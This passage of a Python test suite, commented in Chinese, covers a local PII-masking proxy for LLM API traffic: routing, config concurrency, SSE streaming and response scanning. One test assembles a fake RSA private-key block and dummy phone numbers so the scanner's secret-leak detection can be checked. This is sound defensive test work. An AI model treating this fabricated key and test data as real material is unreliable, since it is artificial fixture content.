        event_store.clear_audit_events()
        old_ts = time.time() - 60
        event_store.enqueue_audit_event({"ts": old_ts, "signal_type": "old", "severity": "LOW"})
        time.sleep(0.02)
        r = event_store.clear_audit_events()
        self.assertTrue(r["ok"])
        event_store.flush_audit_queue()
        evs = event_store.fetch_audit_events(limit=100)
        self.assertFalse(any(e.get("signal_type") == "old" for e in evs), "旧审计事件不得回写")
        # 新事件照常
        event_store.enqueue_audit_event({"ts": time.time(), "signal_type": "new", "severity": "LOW"})
        event_store.flush_audit_queue()
        evs = event_store.fetch_audit_events(limit=100)
        self.assertTrue(any(e.get("signal_type") == "new" for e in evs))

    def test_clear_events_race_old_queue_events_do_not_resurface(self):
        """P1-5：清空后，cutoff 前入队的旧事件不回写；清空后新事件正常落库。"""
        old_ts = time.time() - 60
        event_store.enqueue_event({"ts": old_ts, "type": "MASK", "count": 1, "host": "old"})
        time.sleep(0.02)
        r = event_store.clear_events()
        self.assertTrue(r.get("ok"))
        event_store.flush_event_queue()
        evs = event_store.fetch_events(limit=100)
        self.assertFalse(any(e.get("host") == "old" for e in evs), "旧队列事件不得回写")
        # 新事件照常
        event_store.enqueue_event({"ts": time.time(), "type": "MASK", "count": 1, "host": "new"})
        event_store.flush_event_queue()
        evs = event_store.fetch_events(limit=100)
        self.assertTrue(any(e.get("host") == "new" for e in evs))


class ReverseRoutingPathPrefixTests(unittest.TestCase):
    """P1-3：upstream target 带路径前缀时，保护态与透传态转发一致。"""

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr.UPSTREAMS = [{
            "name": "upstream-a", "port": 18709, "base_path": "/upstream-a",
            "target": "https://api.example.com/v1",
            "paths": ["/v1/chat/completions", "/v1/messages"],
        }]
        tr.CAPTURE_MODE = "reverse"

    def _reverse_flow(self, path, body, listen_port=None):
        req = SimpleNamespace(
            pretty_host="127.0.0.1", path=path,
            headers={"content-type": "application/json"},
            content=json.dumps(body, ensure_ascii=False).encode("utf-8"),
            host="127.0.0.1", port=5802, scheme="http", method="POST",
        )
        client_conn = None
        if listen_port is not None:
            client_conn = SimpleNamespace(sockname=("127.0.0.1", listen_port))
        return SimpleNamespace(request=req, response=None, metadata={}, client_conn=client_conn)

    def _no_reload(self, fn):
        old_reload, old_emit = tr._maybe_reload, tr._emit
        try:
            tr._maybe_reload = lambda force=False: None
            tr._emit = lambda *args, **kwargs: None
            return fn()
        finally:
            tr._maybe_reload, tr._emit = old_reload, old_emit

    def test_multiport_mode_prepends_target_path_prefix(self):
        """多端口模式：客户端打 /chat/completions，target 带 /v1 → 转发 /v1/chat/completions。"""
        def run():
            flow = self._reverse_flow("/chat/completions", {
                "messages": [{"role": "user", "content": "你好"}]
            }, listen_port=18709)
            tr.request(flow)
            self.assertEqual(flow.request.host, "api.example.com")
            self.assertEqual(flow.request.path, "/v1/chat/completions",
                             "target 路径前缀必须拼回（透传层同口径，审计 P1-3）")
        self._no_reload(run)

    def test_prefix_mode_prepends_target_path_prefix(self):
        """单端口前缀模式：剥 base_path 后同样拼回 target 路径前缀（与透传层同口径）。"""
        def run():
            flow = self._reverse_flow("/upstream-a/chat/completions", {
                "messages": [{"role": "user", "content": "你好"}]
            })
            tr.request(flow)
            self.assertEqual(flow.request.path, "/v1/chat/completions")
        self._no_reload(run)

    def test_upstream_path_ok_accepts_final_and_stripped(self):
        up = tr.UPSTREAMS[0]
        self.assertTrue(tr._upstream_path_ok(up, "/chat/completions", final_path="/v1/chat/completions"))
        self.assertTrue(tr._upstream_path_ok(up, "/v1/chat/completions", final_path="/v1/chat/completions"))
        self.assertFalse(tr._upstream_path_ok(up, "/other", final_path="/v1/other"))


class ResponseScanWithoutMasksTests(unittest.TestCase):
    """P1-4：无请求脱敏项时，模型回复里的外部 PII 也要扫描。"""

    def test_scan_warns_on_model_generated_pii_with_empty_fwd(self):
        old_scan = tr.RESPONSE_SCAN
        old_emit = tr._emit
        captured = []
        try:
            tr.RESPONSE_SCAN = True
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            sid = "scan-nofwd"
            tr._new_session(sid)
            flow = SimpleNamespace(
                request=SimpleNamespace(host="api.openai.com", method="POST", path="/v1/chat/completions"),
                response=SimpleNamespace(
                    headers={"content-type": "application/json"},
                    content=json.dumps({"choices": [{"message": {"content": "我查到电话13900001111"}}]}).encode("utf-8"),
                ),
                metadata={"session_id": sid},
            )
            tr._scan_response(flow, sid, "api.openai.com", "POST", "/v1/chat/completions", {})
        finally:
            tr.RESPONSE_SCAN = old_scan
            tr._emit = old_emit
        warns = [kw for typ, kw in captured if typ == "SCAN_WARN"]
        self.assertTrue(warns, "无请求脱敏项也应扫描模型回复（曾提前 return 漏检）")
        self.assertTrue(any(it.get("label") == "PHONE" for it in warns[0]["items"]))

    def test_scan_body_length_cap_and_rule_markers_precheck(self):
        """P2-5：超长响应只扫前段（_SCAN_BODY_MAX），特征预检（_rule_may_hit）不漏有效命中。"""
        old_scan = tr.RESPONSE_SCAN
        old_emit = tr._emit
        captured = []
        try:
            tr.RESPONSE_SCAN = True
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            sid = "scan-cap-test"
            tr._new_session(sid)
            pem = ("-----BEGIN " + "RSA PRIVATE KEY-----\n12345678901234567890\n-----END " + "RSA PRIVATE KEY-----")
            # 1. 正常长度含命中（含 marker 的 PRIVATE_KEY）
            flow = SimpleNamespace(
                request=SimpleNamespace(host="api.openai.com", method="POST", path="/v1/chat/completions"),
                response=SimpleNamespace(
                    headers={"content-type": "application/json"},
                    content=json.dumps({"choices": [{"message": {"content": pem}}]}).encode("utf-8"),
                ),
                metadata={"session_id": sid},
            )
            with mock.patch.dict(tr.BUILTIN_RULES, {"PRIVATE_KEY": True}):
                tr._scan_response(flow, sid, "api.openai.com", "POST", "/v1/chat/completions", {})
            warns = [kw for typ, kw in captured if typ == "SCAN_WARN"]
            self.assertTrue(warns)
            self.assertTrue(any(it.get("label") == "PRIVATE_KEY" for it in warns[0]["items"]))

            # 2. 超长体量截断：尾部远超 _SCAN_BODY_MAX 的内容不霸占事件循环
            captured.clear()
            huge_padding = "x" * 2000
            # mock 一个较小的 cap 验证截断行为
            with mock.patch.object(tr, "_SCAN_BODY_MAX", 100), \
                 mock.patch.dict(tr.BUILTIN_RULES, {"PRIVATE_KEY": True}):
                flow_huge = SimpleNamespace(
                    request=SimpleNamespace(host="api.openai.com", method="POST", path="/v1/chat/completions"),
                    response=SimpleNamespace(
                        headers={"content-type": "application/json"},
                        content=(huge_padding + pem).encode("utf-8"),
                    ),
                    metadata={"session_id": sid},
                )
                tr._scan_response(flow_huge, sid, "api.openai.com", "POST", "/v1/chat/completions", {})
            # 截断后前 100 字节全是 "x"，PRIVATE_KEY 在尾部被截掉，不应产生报警且不能报错
            warns_huge = [kw for typ, kw in captured if typ == "SCAN_WARN"]
            self.assertFalse(warns_huge)
        finally:
            tr.RESPONSE_SCAN = old_scan
            tr._emit = old_emit


class ConfigAndApiTests(unittest.TestCase):
    def test_stop_mode_normalization(self):
        """stop_mode 三态：passthrough（默认）/ error / block。

        默认 passthrough：未启动代理时仍保持正常直接转发（不脱敏直连），保证可用性不中断；
        启动代理后开启脱敏。
        """
        for mode in ("error", "passthrough", "block"):
            self.assertEqual(panel.normalize_config({"stop_mode": mode})["stop_mode"], mode)
        self.assertEqual(panel.normalize_config({"stop_mode": "weird"})["stop_mode"], "passthrough")
        self.assertEqual(panel.normalize_config({"stop_mode": ""})["stop_mode"], "passthrough")
        self.assertEqual(panel.normalize_config({})["stop_mode"], "passthrough")
        self.assertEqual(panel.default_config()["stop_mode"], "passthrough")

    def test_read_settings_honors_top_level_sensitive_word_disabled(self):
        """SHIELD-WORD-DISABLE-001：UI 禁用词写入顶层 sensitive_word_disabled，
        _read_settings 曾只解析 sensitive 内嵌 dict 的 disabled_words，顶层字段被
        忽略导致禁用词持续命中（用户禁「秘密」仍被脱敏）。"""
        old_root = tr._DATA_ROOT
        old_emit = tr._emit
        tmp = Path(tempfile.mkdtemp())
        try:
            cfg = {
                "sensitive": {
                    "密级": ["绝密", "机密", "秘密", "保密"],
                },
                "sensitive_disabled": [],
                "sensitive_word_disabled": {"密级": ["秘密"]},
            }
            (tmp / "config.json").write_text(json.dumps(cfg, ensure_ascii=False), encoding="utf-8")
            tr._DATA_ROOT = tmp
            tr._emit = lambda *a, **k: None
            s = tr._read_settings()
            self.assertIsNotNone(s)
            disabled = s["sensitive_word_disabled"]
            self.assertEqual(disabled.get("密级"), {"秘密"})
            masked = tr.mask("涉及秘密事项与机密文件", "wd-test")
            self.assertIn("机密", masked)
            self.assertIn("秘密", masked, "已禁用词「秘密」不应被脱敏")
            self.assertNotIn("{{", masked.replace("{{机密", ""), "已禁用词不应产生占位符")
        finally:
            tr._DATA_ROOT = old_root
            tr._emit = old_emit

    def test_restore_emit_carries_user_dialog(self):
        """SHIELD-DIALOG-002：RESTORE 事件必须带 dialog_req（用户消息）。
        曾 100% 缺失——回复日志弹窗永远看不到用户发送的内容。"""
        old_emit = tr._emit
        captured = []
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            sid = "dlg-req-001"
            tr._new_session(sid)
            tr.sessions[sid]["req_dialog"] = "【用户】\n我叫张三"
            tr.sessions[sid]["fwd"] = {"张三": "{{NAME_abcdef}}"}
            tr.sessions[sid]["labels"] = {"张三": "NAME"}
            tr.sessions[sid]["model"] = "gpt-4"
            flow = SimpleNamespace(
                request=SimpleNamespace(host="api.openai.com", method="POST", path="/v1/chat/completions"),
                response=SimpleNamespace(
                    status_code=200,
                    content=json.dumps({"choices": [{"message": {"content": "你好张三"}}]}, ensure_ascii=False).encode("utf-8"),
                ),
            )
            tr._emit_restore_summary(flow, sid, "api.openai.com", "POST", "/v1/chat/completions", {}, ok=True)
        finally:
            tr._emit = old_emit
        restores = [kw for typ, kw in captured if typ == "RESTORE"]
        self.assertTrue(restores, "应产生 RESTORE 事件")
        self.assertEqual(restores[-1].get("dialog_req"), "【用户】\n我叫张三")
        self.assertIn("你好张三", restores[-1].get("dialog") or "")

    def test_config_roundtrip_consistency(self):
        """SHIELD-CONFIG-001：面板 normalize_config 的输出必须能被引擎
        _read_settings 无损消费。防「面板写一套结构、引擎读另一套」类
        漏读回归（sensitive_word_disabled 曾因此失效）。"""
        old_root = tr._DATA_ROOT
        old_emit = tr._emit
        tmp = Path(tempfile.mkdtemp())
        try:
            cfg = panel.normalize_config({})
            cfg["sensitive"] = {"密级": ["绝密", "机密", "秘密", "保密"], "地域": ["高新区"]}
            cfg["sensitive_disabled"] = ["地域"]
            cfg["sensitive_word_disabled"] = {"密级": ["秘密"]}
            cfg["builtin_rules"]["HKID"] = False
            cfg["fail_closed"] = True
            cfg["filter_enabled"] = True
            (tmp / "config.json").write_text(json.dumps(cfg, ensure_ascii=False), encoding="utf-8")
            tr._DATA_ROOT = tmp
            tr._emit = lambda *a, **k: None
            s = tr._read_settings()
            self.assertIsNotNone(s)
            self.assertEqual(s["sensitive_word_disabled"].get("密级"), {"秘密"})
            self.assertEqual(s["words"].get("秘密"), "密级")
            self.assertEqual(s["sensitive_disabled"], {"地域"})
            self.assertFalse(s["builtin_rules"]["HKID"])
            self.assertTrue(s["builtin_rules"]["PHONE"], "默认开启的规则不应丢失")
            self.assertTrue(s["fail_closed"])
            self.assertTrue(s["filter_enabled"])
        finally:
            tr._DATA_ROOT = old_root
            tr._emit = old_emit

    def test_status_exposes_stop_mode_and_wizard_recommended(self):
        with panel.app.test_client() as client:
            r = client.get("/api/status", headers={"X-Shield-Token": panel.API_TOKEN})
        self.assertEqual(r.status_code, 200)
        data = r.get_json()
        self.assertIn("stop_mode", data)
        self.assertIn("wizard_recommended", data)

    def test_health_exposes_writer_stats(self):
        with panel.app.test_client() as client:
            r = client.get("/api/health", headers={"X-Shield-Token": panel.API_TOKEN})
        self.assertEqual(r.status_code, 200)
        data = r.get_json()
        self.assertIn("writer_stats", data)
        self.assertIn("event_writer_alive", data["writer_stats"])


class GeminiToolEnumTests(unittest.TestCase):
    """tools schema enum 清洗（Gemini function_declarations 兼容）。

    Gemini 要求 enum 是字符串数组，中转站转换时遇非字符串 enum 会 400 或流式中断，
    故对部分中转 + gemini 模型清洗。清洗必须保持 schema 语义可用。
    """

    def test_empty_after_filter_removes_enum_key(self):
        """过滤后为空必须删掉 enum 键，不能留 `enum: []`。

        空数组语义是「该参数无任何合法取值」，比不带 enum 更糟——模型会认为
        无法构造合法参数而干脆不调用该工具（用户报「Gemini 不调用工具」）。
        boolean/integer 的 enum 天然全非字符串，是最常见命中场景。
        """
        body = {"tools": [{"function": {"parameters": {"properties": {
            "enabled": {"type": "boolean", "enum": [True, False]},
            "limit": {"type": "integer", "enum": [1, 5, 10]},
        }}}}]}
        tr._clean_tool_enums(body)
        props = body["tools"][0]["function"]["parameters"]["properties"]
        self.assertNotIn("enum", props["enabled"], "全非字符串 enum 必须删键而非留空数组")
        self.assertNotIn("enum", props["limit"])
        # 类型等其余约束不受影响
        self.assertEqual(props["enabled"]["type"], "boolean")

    def test_mixed_enum_keeps_only_strings(self):
        """混合 enum 保留字符串项（实测 pi subagent 工具 enum 含 False/1）。"""
        body = {"tools": [{"function": {"parameters": {"properties": {
            "mode": {"enum": ["fast", False, 1, "deep"]},
        }}}}]}
        tr._clean_tool_enums(body)
        self.assertEqual(
            body["tools"][0]["function"]["parameters"]["properties"]["mode"]["enum"],
            ["fast", "deep"])

    def test_all_string_enum_untouched(self):
        """全字符串 enum 原样保留，不得误改。"""
        body = {"tools": [{"function": {"parameters": {"properties": {
            "mode": {"enum": ["fast", "deep"]},
        }}}}]}
        tr._clean_tool_enums(body)
        self.assertEqual(
            body["tools"][0]["function"]["parameters"]["properties"]["mode"]["enum"],
            ["fast", "deep"])

    def test_nested_and_malformed_tools_safe(self):
        """嵌套 schema 递归清洗；tools 非法结构不得抛异常（清洗失败不能拖垮请求）。"""
        body = {"tools": [{"function": {"parameters": {"properties": {
            "obj": {"type": "object", "properties": {
                "flag": {"type": "boolean", "enum": [True]},
                "tag": {"enum": ["a", 2]},
            }},
            "arr": {"type": "array", "items": {"enum": [1, 2]}},
        }}}}]}
        tr._clean_tool_enums(body)
        props = body["tools"][0]["function"]["parameters"]["properties"]
        self.assertNotIn("enum", props["obj"]["properties"]["flag"])
        self.assertEqual(props["obj"]["properties"]["tag"]["enum"], ["a"])
        self.assertNotIn("enum", props["arr"]["items"])
        for bad in ({"tools": "nope"}, {"tools": [None, 1]}, {}, {"tools": [{"function": None}]}):
            tr._clean_tool_enums(bad)  # 不抛异常即可


class SseStreamTerminatorTests(unittest.TestCase):
    """流式接管不得写出 chunked 终止块（P0：断流 + keep-alive 连接污染）。

    `_stream` 在「本次字节凑不出完整 SSE 事件」时若返回 b""，mitmproxy 的
    ResponseData 分支不过滤空块，会按 chunked 语法写成 b"0\\r\\n\\r\\n"——正是
    终止块。后果有两层：

    1. 当前响应被截断：客户端判定响应结束、停止读取并关连接（引擎侧只看到
       CANCEL Client disconnected），实测 opencode.ai 首字节后 0.3s 内即断。
    2. keep-alive 连接被污染：终止块之后引擎继续写的字节留在连接上，被复用该
       连接的下一个请求当成状态行读，客户端报 BadStatusLine，上游侧表现为
       [WinError 121] 信号灯超时 → 502。一条连接坏掉会连锁拖垮整个连接池，
       即用户报的「怎么现在全是这个错误」。

    本地复现见 tests/repro_chunk_terminator.py（缺陷臂：请求1 收到 0B 无 [DONE]，
    请求2 复用连接报 BadStatusLine: 0；修复臂：234B 含 [DONE]，请求2 HTTP 200）。
    """

    def tearDown(self):
        # 流完成时 _finish → _emit_restore_summary 会 enqueue RESTORE 事件（异步写线程）。
        # 不 flush 会残留队列，污染后续 WriterAccountingTests 的 dead_letters 计数
        # （unittest 类按字母序：Sse < Writer，残留 1-2 条被算进死信，必现/间歇失败）。
        event_store.flush_event_queue()

    def _sid_flow(self):
        flow = SimpleNamespace(
            request=SimpleNamespace(
                method="POST", host="api.example.com", pretty_host="api.example.com",
                path="/v1/chat/completions",
                headers={"content-type": "application/json"},
                content=json.dumps({"messages": [{"role": "user", "content": "hi"}]}).encode(),
            ),
            response=SimpleNamespace(
                headers={"content-type": "text/event-stream"}, status_code=200, content=b"",
            ),
            metadata={},
        )
        sid = "t" + str(int(time.time() * 1000))[-7:]
        tr._new_session(sid, source={})
        flow.metadata["session_id"] = sid
        return flow, sid

    def test_midstream_empty_returns_list_not_bytes(self):
        """事件被 TCP 边界切开时，中途块必须返回 []，绝不能返回 b""。"""
        flow, sid = self._sid_flow()
        stream = tr._sse_stream_factory(
            flow, sid, "api.example.com", "POST", "/v1/chat/completions", {})
        event = b'data: {"choices":[{"delta":{"content":"hello"}}]}\n\n'
        # 切三段：前两段都缺 \n\n，凑不出完整事件
        for part in (event[:15], event[15:30]):
            out = stream(part)
            self.assertEqual(out, [], "半个事件必须返回空列表")
            self.assertNotIsInstance(out, bytes, "返回 bytes 会被写成 chunked 终止块")
        tail = stream(event[30:])
        self.assertIsInstance(tail, bytes)
        self.assertIn("hello", tail.decode("utf-8"))
        stream(b"")

    def test_last_chunk_may_return_empty_bytes(self):
        """末块（data=b""）走 EndOfMessage 分支，那里对 b"" 有过滤，返回 bytes 安全。"""
        flow, sid = self._sid_flow()
        stream = tr._sse_stream_factory(
            flow, sid, "api.example.com", "POST", "/v1/chat/completions", {})
        stream(b'data: {"choices":[{"delta":{"content":"x"}}]}\n\n')
        last = stream(b"")
        self.assertIsInstance(last, bytes, "末块必须返回 bytes，供 mitmproxy 走收尾分支")

    def test_no_default_stream_exclude_hosts(self):
        """默认黑名单必须为空：opencode.ai 曾被误判为「上游不支持接管」，

        真因是上述自身缺陷。修复后实测 567 chunk / 54 个到达时刻 / 7.65s 出字窗口，
        预置该 host 只会让升级用户白白失去流式。
        """
        self.assertEqual(tr._DEFAULT_STREAM_EXCLUDE_HOSTS, set())
        self.assertEqual(panel.default_config()["stream_exclude_hosts"], [])


class ConfigConcurrencyTests(unittest.TestCase):
    """配置读-改-写必须串行，否则并发保存丢更新。

    原子写只保证文件不半截，挡不住「两个线程各读到旧配置、各改一处、后写的
    覆盖先写的」。Flask 默认多线程，/api/config 保存与 load_config 内部的迁移
    写入会真实并发。
    """

    def test_concurrent_save_does_not_lose_updates(self):
        old_cfg = panel.CONFIG_PATH
        tmp = Path(tempfile.mkdtemp())
        try:
            panel.CONFIG_PATH = tmp / "config.json"
            panel.save_config(panel.default_config())

            errors = []

            def bump(key, value):
                # 典型的读-改-写：全程持锁才不会互相覆盖
                try:
                    for _ in range(20):
                        with panel.cfg_lock:
                            cfg = panel.load_config()
                            cfg[key] = value
                            panel.save_config(cfg)
                except Exception as e:  # 线程异常不会让主线程失败，显式收集
                    errors.append(e)

            threads = [
                threading.Thread(target=bump, args=("session_ttl", 1234)),
                threading.Thread(target=bump, args=("log_retention_days", 9)),
            ]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=30)

            self.assertEqual(errors, [], f"并发保存抛异常: {errors}")
            final = panel.load_config()
            # 两个 key 都必须留下，任一丢失即发生了覆盖
            self.assertEqual(final["session_ttl"], 1234)
            self.assertEqual(final["log_retention_days"], 9)
        finally:
            panel.CONFIG_PATH = old_cfg

    def test_api_config_endpoint_concurrent_posts_do_not_lose_updates(self):
        """测试 /api/config 真实接口在并发 POST 提交部分字段时，读改写原子性保证字段不丢失。"""
        import concurrent.futures
        old_cfg = panel.CONFIG_PATH
        tmp = Path(tempfile.mkdtemp())
        client = panel.app.test_client()
        headers = {"X-Shield-Token": panel.API_TOKEN}
        try:
            panel.CONFIG_PATH = tmp / "config.json"
            panel.save_config(panel.default_config())

            def post_field(data):
                return client.post("/api/config", json=data, headers=headers)

            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                f1 = executor.submit(post_field, {"origin_check": False})
                f2 = executor.submit(post_field, {"debug": True})
                r1 = f1.result(timeout=10)
                r2 = f2.result(timeout=10)

            self.assertEqual(r1.status_code, 200)
            self.assertEqual(r2.status_code, 200)
            final = panel.load_config()
            self.assertFalse(final["origin_check"], "origin_check 必须为 False，绝不能被另一个请求覆盖成旧值")
            self.assertTrue(final["debug"], "debug 必须为 True，绝不能被另一个请求覆盖成旧值")
        finally:
            panel.CONFIG_PATH = old_cfg

    def test_cfg_lock_is_reentrant(self):
        """load_config 内部会调 save_config 落迁移标记，锁必须可重入，否则自死锁。"""
        self.assertIsInstance(panel.cfg_lock, type(threading.RLock()))
        with panel.cfg_lock:
            with panel.cfg_lock:
                pass


class WriterAccountingTests(unittest.TestCase):
    """写线程的失败计数必须反映真实丢失量，摘要失败必须留痕。"""

    def test_dead_letters_counts_events_not_batches(self):
        """一批 N 条全失败要计 N，不是 1。

        dead_letters 与 drops 同口径（按事件条数）。按批 +1 会让 DB 持续故障时
        数字看着"还好"——50 条丢了只显示 1，运维据此判断"偶发"而放过真故障。
        """
        orig = event_store._append_many_with_degrade
        orig_stats = dict(event_store._writer_stats)
        try:
            # 模拟 DB 系统性不可写：降级后仍全部失败
            event_store._append_many_with_degrade = lambda items: (0, len(items))
            event_store._writer_stats["dead_letters"] = 0
            event_store._reset_writer()
            for i in range(30):
                event_store.enqueue_event(
                    {"ts": time.time(), "type": "MASK", "sid": f"s{i}", "count": 1})
            deadline = time.time() + 8
            while time.time() < deadline and event_store._writer_stats["dead_letters"] < 30:
                time.sleep(0.15)
            self.assertEqual(event_store._writer_stats["dead_letters"], 30,
                             "死信必须按事件条数累计")
        finally:
            event_store._append_many_with_degrade = orig
            event_store._writer_stats.update(orig_stats)
            event_store._reset_writer()

    def test_stats_failure_is_counted_not_silent(self):
        """摘要写入失败不抛出（不能拖垮同事务的事件落库），但必须计数留痕。

        静默 pass 会让「今日统计」长期偏差且无人知晓——摘要表是面板首屏口径。
        """
        before = event_store._stats_write_errors

        class BoomConn:
            def execute(self, *a, **k):
                raise RuntimeError("db locked")

        # 不得抛出：调用方在事务里，异常会连带回滚已写入的事件
        event_store._update_stats(BoomConn(), {"ts": time.time(), "type": "MASK", "count": 1})
        self.assertGreater(event_store._stats_write_errors, before,
                           "摘要失败必须累加计数，不能静默吞掉")


class StabilityFixTests(unittest.TestCase):
    """v1.5.61 稳定性修复回归：偶发「软件启动了也不能正常转发」的几条根因。"""

    def test_mask_replaces_each_unique_original_once(self):
        """脱敏替换必须按唯一原文，不能按命中次数。

        曾 `for orig in matched` 直接遍历命中列表：同一个手机号在长上下文里出现
        上万次，就对全文做上万次 str.replace（而 str.replace 本就是全局替换，
        第二次起纯属无用功）→ 整条管线退化成 O(命中次数 × 文本长度)。
        实测 256KB 请求体命中 11037 次、唯一原文仅 4 个，替换环节耗时 930ms；
        512KB 达 3.7s。addon 在 asyncio event loop 上同步执行，这几秒会冻结
        所有 upstream 端口的连接（含进行中的 SSE 流）。
        """
        sid = "dedup01"
        tr._new_session(sid)
        self.addCleanup(tr._drop, sid)
        # 同一手机号重复 500 次
        text = "联系 13800138000 ；" * 500
        calls = {"n": 0}
        real_replace = str.replace

        class CountingStr(str):
            def replace(self, *a, **kw):
                calls["n"] += 1
                return CountingStr(real_replace(self, *a, **kw))

        out = tr.mask(CountingStr(text), sid)
        self.assertNotIn("13800138000", out, "原文必须全部被替换")
        self.assertEqual(out.count("{{"), 500, "每一处出现都要换成占位符")
        # 命中 500 次但唯一原文只有 1 个 → 替换调用必须是个位数（内置规则数量级），
        # 绝不能随命中次数线性增长
        self.assertLess(calls["n"], 20,
                        f"替换调用 {calls['n']} 次，说明未按唯一原文去重（二次方复杂度回归）")

    def test_mask_output_unchanged_by_dedup(self):
        """去重只去掉无用功，脱敏结果必须逐字节不变。"""
        sid = "dedup02"
        tr._new_session(sid)
        self.addCleanup(tr._drop, sid)
        # 邮箱本地部分须 ≥2 字符才命中 EMAIL 规则（防误报的既有设计），别用 a@b.com
        text = "张三 13800138000 邮箱 alice@example.com；李四 13900139000 邮箱 bob@example.com；" * 30
        out = tr.mask(text, sid)
        for leaked in ("13800138000", "13900139000", "alice@example.com", "bob@example.com"):
            self.assertNotIn(leaked, out)
        # 相同原文必须映射到同一个占位符（复用语义不能被去重破坏）
        tokens = re.findall(tr._PLACEHOLDER_RX, out)
        self.assertEqual(len(set(tokens)), 4, "4 个唯一原文应对应 4 个唯一占位符")
        self.assertEqual(len(tokens), 4 * 30, "每处出现都应有占位符")

    def test_listening_port_pids_fresh_bypasses_cache(self):
        """启停路径必须拿实时端口快照，不能吃 3s 缓存。

        start_proxy 在 _stop_passthrough() 真实释放端口后立刻查占用，若读到旧
        快照就会误判「端口被非 mitmdump 进程占用，无法启动」→ 启动失败 →
        （stop_mode=block 时）全部 upstream 端口无人监听 → 客户端集体断网。
        """
        old_cache = dict(panel._netstat_cache)
        self.addCleanup(lambda: panel._netstat_cache.update(old_cache))
        old_run = panel._run_console
        self.addCleanup(lambda: setattr(panel, "_run_console", old_run))

        netstat_calls = {"n": 0}
        listening = {"on": True}

        def fake_run(argv, timeout=None):
            if argv and argv[0] == "netstat":
                netstat_calls["n"] += 1
                if listening["on"]:
                    return 0, "  TCP    127.0.0.1:18777   0.0.0.0:0   LISTENING   4321\n"
                return 0, ""
            return old_run(argv, timeout=timeout)

        panel._run_console = fake_run
        panel._netstat_cache["ts"] = 0.0
        panel._netstat_cache["data"] = {}

        with mock.patch.object(panel.sys, "platform", "win32"):
            self.assertEqual(panel._listening_port_pids({18777}), {18777: {4321}})
            listening["on"] = False  # 端口真实释放（等价 _stop_passthrough）
            # 默认走缓存：仍是旧快照
            self.assertEqual(panel._listening_port_pids({18777}), {18777: {4321}},
                             "轮询路径应继续吃缓存（保住 netstat 降频优化）")
            # 启停路径：必须实时
            self.assertEqual(panel._listening_port_pids({18777}, fresh=True), {},
                             "fresh=True 必须绕过缓存，否则启动会被旧快照误判为端口占用")
            # fresh 之后缓存也应被刷新，后续轮询不再拿到过期数据
            self.assertEqual(panel._listening_port_pids({18777}), {})

    def test_expected_listen_ports_covers_every_upstream(self):
        """就绪判定要覆盖全部 upstream 端口，不能只看第一个。

        曾只探 upstreams[0]：其余端口绑定失败照样报「启动成功」，面板显示
        运行中，那些 upstream 的客户端却一直连不上。
        """
        cfg = {"capture_mode": "reverse", "upstreams": [
            {"name": "a", "port": 18701}, {"name": "b", "port": 18702},
            {"name": "c", "port": 18703}, {"name": "bad", "port": 0},
        ]}
        self.assertEqual(panel._expected_listen_ports(cfg), [18701, 18702, 18703])
        # 非 reverse 保持历史语义：单个 PROXY_PORT
        self.assertEqual(panel._expected_listen_ports({"capture_mode": "explicit"}),
                         [panel.PROXY_PORT])

    def test_is_mitmdump_pid_recognizes_python_child(self):
        """mitmdump 拉起的 python.exe 子进程也必须被认出来。

        原兜底用 `wmic process`，而 Windows 11 24H2 起系统已默认移除 WMIC
        （本机 `where wmic` 找不到）→ 该分支恒抛异常返回 False → 子进程占着
        端口却不被识别、释放不掉 → 下次启动报「端口被非 mitmdump 进程占用」。
        """
        old_run = panel._run_console
        self.addCleanup(lambda: setattr(panel, "_run_console", old_run))
        cmdlines = {}

        def fake_run(argv, timeout=None):
            if argv and argv[0] == "tasklist":
                return 0, '"python.exe","4321","Console","1","20,000 K"\n'
            if argv and argv[0] == "powershell":
                pid = argv[-1].split("ProcessId=")[1].split("'")[0]
                return 0, cmdlines.get(pid, "")
            return old_run(argv, timeout=timeout)

        panel._run_console = fake_run
        with mock.patch.object(panel.sys, "platform", "win32"):
            cmdlines["4321"] = r"C:\Python313\python.exe C:\Apps\shield\transparent.py"
            self.assertTrue(panel._is_mitmdump_pid(4321),
                            "加载了本项目 addon 的 python 子进程必须被识别为引擎进程")
            cmdlines["4321"] = r"C:\Python313\python.exe manage.py runserver"
            self.assertFalse(panel._is_mitmdump_pid(4321),
                             "无关 python 进程绝不能被误判（会被强杀，有数据丢失风险）")

    def test_start_fallback_dispatches_by_stop_mode(self):
        """三种 stop_mode 各自的兜底形态必须分派正确。"""
        old_cfg = panel.load_config
        old_pt = panel._start_passthrough
        old_err = panel._start_error_listener
        old_emit = panel._emit_log
        self.addCleanup(lambda: setattr(panel, "load_config", old_cfg))
        self.addCleanup(lambda: setattr(panel, "_start_passthrough", old_pt))
        self.addCleanup(lambda: setattr(panel, "_start_error_listener", old_err))
        self.addCleanup(lambda: setattr(panel, "_emit_log", old_emit))
        hits = []
        panel._emit_log = lambda line: None
        panel._start_passthrough = lambda: hits.append("passthrough") or 1
        panel._start_error_listener = lambda: hits.append("error") or 1

        for mode, expect in (("error", ["error"]), ("passthrough", ["passthrough"]), ("block", [])):
            hits.clear()
            panel.load_config = lambda m=mode: {**panel.default_config(), "stop_mode": m}
            panel._start_fallback("test")
            self.assertEqual(hits, expect, f"stop_mode={mode} 分派错误")

    def test_error_listener_returns_503_json(self):
        """stop_mode=error：端口继续监听，请求收到 503 + 可解析的错误结构。

        对比 block 的「端口无人监听」——那种情况客户端只报网络异常，
        用户根本判断不出是 Shield 没起来（历史上最难排查的一类故障）。
        """
        import http.client
        import socket

        # 取一个空闲端口
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()

        old_cfg = panel.load_config
        old_emit = panel._emit_log
        self.addCleanup(lambda: setattr(panel, "load_config", old_cfg))
        self.addCleanup(lambda: setattr(panel, "_emit_log", old_emit))
        self.addCleanup(panel._stop_passthrough)
        panel._emit_log = lambda line: None
        panel.load_config = lambda: {**panel.default_config(), "stop_mode": "error",
